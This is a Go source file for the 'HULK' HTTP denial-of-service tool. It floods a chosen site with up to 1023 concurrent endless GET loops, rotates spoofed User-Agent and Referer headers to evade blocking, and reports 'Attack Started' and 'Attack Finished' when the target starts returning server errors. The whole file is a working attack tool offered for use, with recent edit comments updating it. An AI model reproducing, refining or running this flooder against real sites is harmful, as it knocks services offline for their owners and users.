package main

import (
    "flag"
    "fmt"
    "math/rand"
    "net/http"
    "net/url"
    "os"
    "os/signal"
    "strconv"
    "strings" // ✅ Re-added "strings" import (fixing "undefined: strings" error)
    "sync/atomic"
    "syscall"
)

// Define arrayFlags type (fixes "undefined: arrayFlags" error)
type arrayFlags []string

func (i *arrayFlags) String() string {
    return "[" + strings.Join(*i, ",") + "]"
}

func (i *arrayFlags) Set(value string) error {
    *i = append(*i, value)
    return nil
}

const __version__ = "1.0.1"

const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
    callGotOk           uint8 = iota
    callExitOnErr
    callExitOnTooManyFiles
    callBlocked
    targetComplete
)

// Global Variables
var (
    safe bool
    
    // ✅ Re-added the original headersReferers list
    headersReferers = []string{
        "http://www.google.com/?q=",
        "http://www.usatoday.com/search/results?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://www.bing.com/search?q=",
        "http://search.yahoo.com/search?p=",
    }
    
    // ✅ Updated User-Agent List (2025)
    headersUseragents = []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/537.36",
        "Mozilla/5.0 (Android 14; Mobile; rv:122.0) Gecko/122.0 Firefox/122.0",
    }
    
    cur int32
)

func main() {
    var (
        version bool
        site    string
        agents  string
        data    string
        headers arrayFlags
    )

    flag.BoolVar(&version, "version", false, "print version and exit")
    flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
    flag.StringVar(&site, "site", "http://localhost", "Destination site.")
    flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file.")
    flag.StringVar(&data, "data", "", "Data to POST. If present, hulk will use POST requests instead of GET")
    flag.Var(&headers, "header", "Add headers to the request.")
    flag.Parse()

    t := os.Getenv("HULKMAXPROCS")
    maxproc, err := strconv.Atoi(t)
    if err != nil {
        maxproc = 1023
    }

    u, err := url.Parse(site)
    if err != nil {
        fmt.Println("Error parsing URL parameter")
        os.Exit(1)
    }

    if version {
        fmt.Println("Hulk", __version__)
        os.Exit(0)
    }

    go func() {
        fmt.Println("-- HULK Attack Started --\n        Go!\n")
        ss := make(chan uint8, 8)
        var errCount, sent, blocked int32

        fmt.Println("In use      |  Resp OK |  Got err  |  Blocked")

        for {
            if atomic.LoadInt32(&cur) < int32(maxproc-1) {
                go httpcall(site, u.Host, data, headers, ss)
            }
            if sent%10 == 0 {
                fmt.Printf("\r%6d of max %-6d | %7d | %7d | %7d", cur, maxproc, sent, errCount, blocked)
            }
            switch <-ss {
            case callExitOnErr:
                atomic.AddInt32(&cur, -1)
                errCount++
            case callExitOnTooManyFiles:
                atomic.AddInt32(&cur, -1)
                maxproc--
            case callGotOk:
                sent++
            case callBlocked:
                blocked++
            case targetComplete:
                sent++
                fmt.Printf("\r%-6d of max %-6d | %7d | %7d | %7d", cur, maxproc, sent, errCount, blocked)
                fmt.Println("\r-- HULK Attack Finished --\n\n")
                os.Exit(0)
            }
        }
    }()

    ctlc := make(chan os.Signal)
    signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
    <-ctlc
    fmt.Println("\r\n-- Interrupted by user --\n")
}

func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
    atomic.AddInt32(&cur, 1)

    var client = new(http.Client)

    for {
        q, err := http.NewRequest("GET", url, nil)
        if err != nil {
            s <- callExitOnErr
            return
        }

        q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
        q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]) // ✅ Now using Referrers

        r, e := client.Do(q)
        if e != nil {
            s <- callExitOnErr
            return
        }
        defer r.Body.Close()

        if r.StatusCode == 200 {
            s <- callGotOk
        } else {
            s <- callBlocked
        }

        if safe && r.StatusCode >= 500 {
            s <- targetComplete
        }
    }
}
